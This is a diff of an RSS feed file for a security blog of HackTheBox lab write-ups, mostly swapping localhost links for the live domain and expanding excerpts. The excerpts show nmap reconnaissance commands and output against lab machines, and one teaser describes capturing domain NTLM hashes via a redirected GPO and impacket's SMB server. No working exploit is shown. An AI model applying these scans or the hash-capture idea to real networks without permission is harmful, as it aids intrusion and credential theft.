-      <description>External Recon # You know the dance. We start with nmap.&#xA;nmap -sV -sC -oN initial -T4 10.10.10.147 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA) | 256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA) |_ 256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel As there&amp;rsquo;s not much to see here I visited the website.</description>
+      <guid>https://www.tagnull.de/docs/HTB-Writeups/safe/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;safe-banner.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;external-recon&#34;&gt;&#xA;  External Recon&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#external-recon&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;You know the dance. We start with nmap.&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -sV -sC -oN initial -T4 10.10.10.147&#xA;&#xA;22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)&#xA;| ssh-hostkey:&#xA;|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)&#xA;|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)&#xA;|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)&#xA;80/tcp open  http    Apache httpd 2.4.25 ((Debian))&#xA;|_http-server-header: Apache/2.4.25 (Debian)&#xA;|_http-title: Apache2 Debian Default Page: It works&#xA;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As there&amp;rsquo;s not much to see here I visited the website.&#xA;Only the Apache2 default page was shown. Maybe we can find more about this by running a script scan.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Fortune</title>
-      <link>http://localhost:1313/docs/HTB-Writeups/fortune/</link>
+      <link>https://www.tagnull.de/docs/HTB-Writeups/fortune/</link>
       <pubDate>Sat, 31 Aug 2019 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/HTB-Writeups/fortune/</guid>
-      <description>External Recon # I started with my usual &amp;ldquo;nmap&amp;rdquo; scan:&#xA;nmap -sC -sV -oN initial 10.10.10.127 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (protocol2.0) 80/tcp open http OpenBSD httpd |_http-server-header: OpenBSD httpd |_http-title: Fortune 443/tcp open ssl/https? Most of the time you&amp;rsquo;ll have the best chances to find something on the webservices rather than &amp;ldquo;ssh&amp;rdquo;.&#xA;So let&amp;rsquo;s take a look at &amp;ldquo;port 80&amp;rdquo;:&#xA;You can select a fortune-database as it seems and get a fortune-cookie.</description>
+      <guid>https://www.tagnull.de/docs/HTB-Writeups/fortune/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;fortune-banner.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;external-recon&#34;&gt;&#xA;  External Recon&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#external-recon&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;I started with my usual &amp;ldquo;nmap&amp;rdquo; scan:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -sC -sV -oN initial 10.10.10.127&#xA;&#xA;PORT    STATE SERVICE    VERSION&#xA;22/tcp  open  ssh        OpenSSH 7.9 (protocol2.0)                                         &#xA;80/tcp  open  http       OpenBSD httpd&#xA;|_http-server-header: OpenBSD httpd&#xA;|_http-title: Fortune&#xA;443/tcp open  ssl/https?&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Most of the time you&amp;rsquo;ll have the best chances to find something on the webservices&#xA;rather than &amp;ldquo;ssh&amp;rdquo;.&lt;/p&gt;&#xA;&lt;p&gt;So let&amp;rsquo;s take a look at &amp;ldquo;port 80&amp;rdquo;:&lt;/p&gt;&#xA;&lt;p&gt;&#xA;  &lt;img src=&#34;http_fortune_tool.png&#34; alt=&#34;http_fortune_tool&#34; /&gt;&lt;/p&gt;&#xA;&lt;p&gt;You can select a fortune-database as it seems and get a fortune-cookie.&lt;/p&gt;</description>
     </item>
     <item>
       <title>OneTwoSeven</title>
-      <link>http://localhost:1313/docs/HTB-Writeups/onetwoseven/</link>
+      <link>https://www.tagnull.de/docs/HTB-Writeups/onetwoseven/</link>
       <pubDate>Sat, 31 Aug 2019 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/HTB-Writeups/onetwoseven/</guid>
-      <description>External Recon # I started with my usual &amp;ldquo;nmap&amp;rdquo; scan:&#xA;$ nmap -sC -sV -oN initial 10.10.10.133 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) 80/tcp open http Apache httpd 2.4.25 ((Debian)) After this scan I &amp;ldquo;triple-tap&amp;rdquo; my target with a &amp;ldquo;script-&amp;rdquo; and a &amp;ldquo;all-ports-scan&amp;rdquo;. While the script-scan gave me no obvious further information to work with, the all-ports scan gave me another &amp;ldquo;port 60080 to work with.</description>
+      <guid>https://www.tagnull.de/docs/HTB-Writeups/onetwoseven/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;onetwoseven-banner.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;external-recon&#34;&gt;&#xA;  External Recon&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#external-recon&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;I started with my usual &amp;ldquo;nmap&amp;rdquo; scan:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nmap -sC -sV -oN initial 10.10.10.133&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE VERSION&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http    Apache httpd 2.4.25 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;p&gt;After this scan I &amp;ldquo;triple-tap&amp;rdquo; my target with a &amp;ldquo;script-&amp;rdquo; and a &amp;ldquo;all-ports-scan&amp;rdquo;.&#xA;While the script-scan gave me no obvious further information to work with, the all-ports&#xA;scan gave me another &amp;ldquo;port 60080 to work with.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Querier</title>
-      <link>http://localhost:1313/docs/HTB-Writeups/querier/</link>
+      <link>https://www.tagnull.de/docs/HTB-Writeups/querier/</link>
       <pubDate>Fri, 21 Jun 2019 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/HTB-Writeups/querier/</guid>
-      <description>External Recon # I started with my usual &amp;ldquo;nmap&amp;rdquo; scan:&#xA;$ nmap -sC -sV -oN initial 10.10.10.125 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 1433/tcp open ms-sql-s Microsoft SQL Server 14.00.1000.00 | ms-sql-ntlm-info: | Target_Name: HTB | NetBIOS_Domain_Name: HTB | NetBIOS_Computer_Name: QUERIER | DNS_Domain_Name: HTB.LOCAL | DNS_Computer_Name: QUERIER.HTB.LOCAL | DNS_Tree_Name: HTB.LOCAL |_ Product_Version: 10.0.17763 I reduced the output to the interesting pieces.</description>
+      <guid>https://www.tagnull.de/docs/HTB-Writeups/querier/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;querier_banner.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;external-recon&#34;&gt;&#xA;  External Recon&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#external-recon&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;I started with my usual &amp;ldquo;nmap&amp;rdquo; scan:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nmap -sC -sV -oN initial 10.10.10.125&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;135/tcp  open  msrpc         Microsoft Windows RPC&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;445/tcp  open  microsoft-ds?&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1433/tcp open  ms-sql-s      Microsoft SQL Server  14.00.1000.00&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ms-sql-ntlm-info:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   Target_Name: HTB&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   NetBIOS_Domain_Name: HTB&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   NetBIOS_Computer_Name: QUERIER&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   DNS_Domain_Name: HTB.LOCAL&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   DNS_Computer_Name: QUERIER.HTB.LOCAL&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   DNS_Tree_Name: HTB.LOCAL&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  Product_Version: 10.0.17763&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;p&gt;I reduced the output to the interesting pieces.&#xA;As we found some &amp;ldquo;DNS-Names&amp;rdquo; I put them into my &amp;ldquo;/etc/hosts&amp;rdquo; file.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Irked</title>
-      <link>http://localhost:1313/docs/HTB-Writeups/irked/</link>
+      <link>https://www.tagnull.de/docs/HTB-Writeups/irked/</link>
       <pubDate>Sat, 27 Apr 2019 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/HTB-Writeups/irked/</guid>
-      <description>External Recon # As usual we work our way down the KillChain. Starting with a typical nmap scan.&#xA;nmap -sC -sV -oN inital 10.10.10.117&#xA;This runs all the default labled nmap scripts, enumerates versions of found services and dumps everything into the file inital. Note that a default nmap scan just does TCP scans and only the top 1000 ports.&#xA;Here&amp;rsquo;s the output of said scan:&#xA;PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.</description>
+      <guid>https://www.tagnull.de/docs/HTB-Writeups/irked/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;Irked-Banner.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;external-recon&#34;&gt;&#xA;  External Recon&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#external-recon&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;As usual we work our way down the KillChain. Starting with a typical nmap scan.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;nmap -sC -sV -oN inital 10.10.10.117&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;This runs all the default labled nmap scripts, enumerates versions of found services&#xA;and dumps everything into the file inital. Note that a default nmap scan just&#xA;does TCP scans and only the top 1000 ports.&lt;/p&gt;&#xA;&lt;p&gt;Here&amp;rsquo;s the output of said scan:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PORT    STATE SERVICE VERSION&#xA;22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)                          &#xA;| ssh-hostkey:&#xA;|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)                              &#xA;|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)                              &#xA;|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)                             &#xA;|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)                           &#xA;80/tcp  open  http    Apache httpd 2.4.10 ((Debian))                                        &#xA;|_http-server-header: Apache/2.4.10 (Debian)&#xA;|_http-title: Site doesn&amp;#39;t have a title (text/html).                                        &#xA;111/tcp open  rpcbind 2-4 (RPC #100000)&#xA;| rpcinfo:&#xA;|   program version   port/proto  service&#xA;|   100000  2,3,4        111/tcp  rpcbind&#xA;|   100000  2,3,4        111/udp  rpcbind&#xA;|   100024  1          46965/udp  status&#xA;|_  100024  1          47229/tcp  status&#xA;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                     &#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We note the usual suspects. &amp;ldquo;Port 22/ssh&amp;rdquo; and &amp;ldquo;Port 80/http&amp;rdquo;.&#xA;&amp;ldquo;Port 111/rpcbind&amp;rdquo; is somewhat unusual.&lt;/p&gt;</description>
     </item>
     <item>
       <title>NTLM Hashes via GPO redirect</title>
-      <link>http://localhost:1313/docs/Blog/gettinghashes/</link>
+      <link>https://www.tagnull.de/docs/Blog/gettinghashes/</link>
       <pubDate>Mon, 08 Apr 2019 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Blog/gettinghashes/</guid>
-      <description>A while back Darren Mar-Elia tweeted about sending gpos down the wrong path. More security fun with GPOs :) : https://t.co/wEJhjn9uT5 #grouppolicy #infosec&#xA;&amp;mdash; Darren Mar-Elia (@grouppolicyguy) April 3, 2019 You should read his article before we move on here.&#xA;After I was done I thought: &amp;ldquo;If an attacker can redirect the GPO to a SMB-Share, shouldn&amp;rsquo;t he be able to use tools like impacket&amp;rsquo;s SMB-Server to capture all the NTML hashes in a domain?</description>
+      <guid>https://www.tagnull.de/docs/Blog/gettinghashes/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;privesc.jpg&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;A while back Darren Mar-Elia tweeted about sending gpos down the wrong path.&#xA;&lt;br&gt;&#xA;&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;More security fun with GPOs :) : &lt;a href=&#34;https://t.co/wEJhjn9uT5&#34;&gt;https://t.co/wEJhjn9uT5&lt;/a&gt; &lt;a href=&#34;https://twitter.com/hashtag/grouppolicy?src=hash&amp;amp;ref_src=twsrc%5Etfw&#34;&gt;#grouppolicy&lt;/a&gt; &lt;a href=&#34;https://twitter.com/hashtag/infosec?src=hash&amp;amp;ref_src=twsrc%5Etfw&#34;&gt;#infosec&lt;/a&gt;&lt;/p&gt;&amp;mdash; Darren Mar-Elia (@grouppolicyguy) &lt;a href=&#34;https://twitter.com/grouppolicyguy/status/1113568591322865664?ref_src=twsrc%5Etfw&#34;&gt;April 3, 2019&lt;/a&gt;&lt;/blockquote&gt;&#xA;&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;&#xA;&#xA;&#xA;&lt;br&gt;&#xA;You should read &lt;a href=&#34;https://sdmsoftware.com/group-policy-blog/security-related/sending-gpos-down-the-wrong-track-redirecting-the-gpt/&#34; target=&#34;_blank&#34;&gt;his article&lt;/a&gt; before we move on here.&lt;/p&gt;&#xA;&lt;p&gt;After I was done I thought: &amp;ldquo;If an attacker can redirect the GPO to a SMB-Share, shouldn&amp;rsquo;t he be able to use tools like impacket&amp;rsquo;s SMB-Server to&#xA;capture all the NTML hashes in a domain? Let&amp;rsquo;s try that.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Stratosphere</title>
-      <link>http://localhost:1313/docs/HTB-Writeups/stratosphere/</link>
+      <link>https://www.tagnull.de/docs/HTB-Writeups/stratosphere/</link>
       <pubDate>Mon, 25 Mar 2019 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/HTB-Writeups/stratosphere/</guid>
-      <description>I made this video way back in 2018 for a company meeting. I tried to give even non-technical people a sense of how an attack is carried out. I put it on the HackTheBox Forums a couple weeks ago and decided to get it on my website too.&#xA;Watch it here&#xA;x41</description>
+      <guid>https://www.tagnull.de/docs/HTB-Writeups/stratosphere/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;stratosphere2.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;I made this video way back in 2018 for a company meeting. I tried to give even non-technical people&#xA;a sense of how an attack is carried out. I put it on the HackTheBox Forums a couple weeks ago and decided to get it on my website too.&lt;/p&gt;&#xA;&lt;p&gt;&#xA;  &lt;a href=&#34;https://share.mailbox.org/ajax/share/042ef24700fe286d41a89d70fe284cdd970213046321e1ab/1/8/NDA/NDAvMjMzOA&#34;&gt;Watch it here&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;x41&lt;/p&gt;</description>
     </item>
     <item>
       <title>Access</title>
-      <link>http://localhost:1313/docs/HTB-Writeups/access/</link>
+      <link>https://www.tagnull.de/docs/HTB-Writeups/access/</link>
       <pubDate>Sat, 02 Mar 2019 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/HTB-Writeups/access/</guid>
-      <description>External Recon # We kick off a basic &amp;ldquo;nmap&amp;rdquo; scan:&#xA;nmap -sC -sV 10.10.10.98 PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 23/tcp open telnet? 80/tcp open http Microsoft IIS httpd 7.5 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows As you can see, we find some very common ports. When we visit the website listening on &amp;ldquo;port 80&amp;rdquo; we just find a picture of a server-room.&#xA;Let&amp;rsquo;s check &amp;ldquo;ftp&amp;rdquo; and &amp;ldquo;telnet&amp;rdquo; by running another &amp;ldquo;nmap&amp;rdquo; scan.</description>
+      <guid>https://www.tagnull.de/docs/HTB-Writeups/access/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;access-banner2.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;external-recon&#34;&gt;&#xA;  External Recon&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#external-recon&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;We kick off a basic &amp;ldquo;nmap&amp;rdquo; scan:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -sC -sV 10.10.10.98&#xA;&#xA;PORT   STATE SERVICE VERSION&#xA;21/tcp open  ftp     Microsoft ftpd&#xA;23/tcp open  telnet?&#xA;80/tcp open  http    Microsoft IIS httpd 7.5&#xA;Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see, we find some very common ports.&#xA;When we visit the website listening on &amp;ldquo;port 80&amp;rdquo; we just find a picture&#xA;of a server-room.&lt;/p&gt;&#xA;&lt;p&gt;&#xA;  &lt;img src=&#34;access-port80.png&#34; alt=&#34;Not so big&#34; /&gt;&lt;/p&gt;</description>
     </item>
     <item>
       <title>Ypuffy</title>
-      <link>http://localhost:1313/docs/HTB-Writeups/ypuffy/</link>
+      <link>https://www.tagnull.de/docs/HTB-Writeups/ypuffy/</link>
       <pubDate>Sat, 09 Feb 2019 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/HTB-Writeups/ypuffy/</guid>
-      <description>External Recon # Let&amp;rsquo;s start with nmap. But let&amp;rsquo;s spice it up a bit with an additional script:&#xA;nmap -sC -sV -oN initial --script discovery 10.10.10.107&#xA;The output is quite big. You can the output here.&#xA;The script tries to get as much information as possible of your target and in this case shows some LDAP information and the following open ports:&#xA;Open Ports 22, 80, 139, 389, 445 Explore # The sambaNTPassword Hash immediately caught my attention.</description>
+      <guid>https://www.tagnull.de/docs/HTB-Writeups/ypuffy/</guid>
+      <description>&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;img src=&#34;ypuffy-Banner.png&#34; /&gt;&#xA;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h1 id=&#34;external-recon&#34;&gt;&#xA;  External Recon&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#external-recon&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;Let&amp;rsquo;s start with nmap. But let&amp;rsquo;s spice it up a bit with an additional script:&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;nmap -sC -sV -oN initial --script discovery 10.10.10.107&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;The output is quite big. You can the output &lt;a href=&#34;https://www.tagnull.de/post/ypuffy/nmap.txt&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The script tries to get as much information as possible of your target and in this case shows some LDAP information&#xA;and the following open ports:&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th style=&#34;text-align: center&#34;&gt;Open Ports&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;22, 80, 139, 389, 445&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;h1 id=&#34;explore&#34;&gt;&#xA;  Explore&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#explore&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;The &lt;code&gt;sambaNTPassword&lt;/code&gt; Hash immediately caught my attention.&lt;/p&gt;</description>
     </item>
     <item>
       <title>SecNotes</title>
-      <link>http://localhost:1313/docs/HTB-Writeups/secnotes/</link>
+      <link>https://www.tagnull.de/docs/HTB-Writeups/secnotes/</link>
       <pubDate>Sat, 19 Jan 2019 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/HTB-Writeups/secnotes/</guid>
+      <guid>https://www.tagnull.de/docs/HTB-Writeups/secnotes/</guid>
       <description></description>
     </item>
   </channel>
